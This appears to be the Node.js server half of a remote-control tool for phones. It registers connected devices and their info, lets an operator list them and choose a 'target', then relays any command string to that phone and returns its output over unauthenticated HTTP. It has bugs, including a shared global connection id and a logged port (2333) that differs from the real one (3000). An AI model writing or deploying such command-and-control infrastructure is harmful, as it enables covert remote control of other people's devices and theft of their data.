var http = require('http');
var server = http.createServer(handler);
var url = require("url");
var querystring = require("querystring");
var io = require('socket.io').listen(server);

var thisConnectionId = '';
var phoneFeedback = 'no echo';
var connectedList = {};
var selectedId = 'no selected id';
var connectionListStr = '';
var phoneInfo = '';

io.sockets.on('connection', function(socket){
    thisConnectionId = socket.id;
    console.log('a device is connected with id: ' + thisConnectionId);
    //send connection id to the new connected phone
    socket.emit('yourId', {yourId: thisConnectionId});

    //receive new messages
    socket.on('new message', function(data){
        phoneFeedback = data;
        console.log('new message arrive: ' + data);
        var tmp = data.split(' ');
        var ends = tmp[tmp.length - 1];
        if(ends == 'offline'){
            delete connectedList[tmp[1]];
            selectedId = 'no selected id';
            connectionListStr = '';
            for(var ele in connectedList){
                connectionListStr += connectedList[ele] + '\n';
            }
        }
    });

    socket.on('phone info', function(phoneInfo){
        connectedList[thisConnectionId] = 'connId: ' + thisConnectionId + '\t device info:\t' + phoneInfo + '\n';
        connectionListStr += connectedList[thisConnectionId];
    });

});

function handler(req, res){
    var objectUrl = url.parse(req.url);
    var objectQuery = querystring.parse(objectUrl.query);
    for(var i in objectQuery){
        var cmdInit = objectQuery[i].split(' ');
        switch(cmdInit[0]){
            case 'ls':
                res.write(connectionListStr);
                res.end();
                break;
            case 'choose':
                selectedId = cmdInit[1];
                res.write('Current target: ' + selectedId);
                res.end();
                break;
            default :
                if(selectedId != 'no selected id'){
                    io.sockets.to(selectedId).emit('news', {cmd: objectQuery[i]});
                    console.log('news sent: ' + objectQuery[i]);
                    var polling = setInterval(function(){
                        console.log('polling phone feedback: ' + phoneFeedback);
                        if(phoneFeedback != 'no echo'){
                            res.write(phoneFeedback);
                            res.end();
                            clearInterval(polling);
                        }
                    }, 500);

                    setTimeout(function(){
                        res.write(phoneFeedback);
                        res.end();
                        clearInterval(polling)
                    }, 7000);
                }else{
                    res.write('The given id is not found');
                    res.end();
                }
        }
    }
}

server.listen(3000, function(){
    console.log('listening on *:2333');
});
